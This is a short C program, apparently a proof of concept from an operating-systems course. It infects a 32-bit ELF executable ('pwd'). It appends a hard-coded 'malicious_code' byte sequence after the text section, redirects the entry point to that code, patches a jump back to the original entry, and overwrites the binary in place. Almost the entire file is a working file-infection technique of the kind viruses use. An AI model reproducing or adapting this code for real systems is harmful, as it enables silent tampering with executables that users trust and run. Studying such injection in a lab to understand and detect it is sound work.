#include "stdio.h"
#include "type.h"
#include "elf.h"
#include "string.h"

int main() {
    printf("poc completed!!!\n");
    int test_files_num = 1;
    char elf_names[4][MAX_FILENAME_LENGTH] = {"pwd"};//"rm", "ls", "rm"};
    // char elf_names[4][20] = {"pwd", "cat", "echo","touch"};//"rm", "ls", "rm"};
    int j;
    for (j = 0; j < test_files_num; j++) {
        const int	BUF_SIZ = MAX_FILE_LENGTH;
        u8 filebuf[BUF_SIZE];
        int fd = open(elf_names[j], O_RDWR);
        if (fd == -1)
            return -1;

        struct stat s;
        int ret = stat(elf_names[j], &s);
        assert(ret == 0);
        assert(s.st_size < BUF_SIZE);
        //printf("%x\n", s.st_size);
        read(fd, filebuf, s.st_size);
        close(fd);

        /* analyse the elf file*/
        Elf32_Ehdr* elf_hdr = (Elf32_Ehdr*)(filebuf);

        // find the text section header
        Elf32_Shdr* sec_hdr = (Elf32_Shdr*)(filebuf + elf_hdr->e_shoff + 
                            (1 * elf_hdr->e_shentsize));
        int text_start = sec_hdr->sh_offset;
        int section_size = sec_hdr->sh_size;
        int text_end = text_start + section_size - 1;

        Elf32_Phdr* pram_hdr = (Elf32_Phdr*)(filebuf + elf_hdr->e_phoff + 
                            (1 * elf_hdr->e_phentsize));


        //printf("%x\n", sec_hdr->sh_size);
        //printf("%x\n", text_start);
       // printf("%x\n", text_end);

        int add_instruction_size = 21;
        //printf("%x\n", pram_hdr->p_paddr);
       // printf("%x\n", pram_hdr->p_filesz);
        pram_hdr->p_filesz += add_instruction_size;
        //printf("%x\n", pram_hdr->p_paddr);
        u8 malicious_code[] = { 0x50, 0xb4, 0x0c, 0xb0, 0x21, 0x65, 0x66,
                                0xa3, 0x0d, 0x0c, 0x00, 0x00, 0x58, 0x90, 0x90, 0x90,
                                0xE9 ,0xBF ,0xF7,0xFF ,0xFF};
                        
             
        int original_entry = elf_hdr->e_entry;
        //printf("origin:%x\n", original_entry);
        int i;
        int offset = (text_end + 1 + add_instruction_size-original_entry + 4);
       //printf("%x\n", offset);

        for ( i = add_instruction_size - 4; i < add_instruction_size; i++) {
            malicious_code[i] = offset >> 8 * (i - (add_instruction_size - 4));
            malicious_code[i] = ~malicious_code[i];
        }

        //printf("textend:%x\n", text_end);

        for (i = 0; i < add_instruction_size; i++) {
            filebuf[text_end + 1 + i] = malicious_code[i];
        }

        sec_hdr->sh_size += add_instruction_size;
        elf_hdr->e_entry = text_end + 1;
        // printf("%x\n", elf_hdr->e_entry);

        //strcat(elf_names[j], "_poc");
        int fd2;
        fd2 = open(elf_names[j], O_CREAT | O_RDWR);
        if (fd2 == -1)
            printf("open file fail!\n");

        int n;
        /* write */
        n = write(fd2, filebuf, s.st_size);
        if (n != s.st_size)
            printf("write file error!\n");
    }

    return 0;
}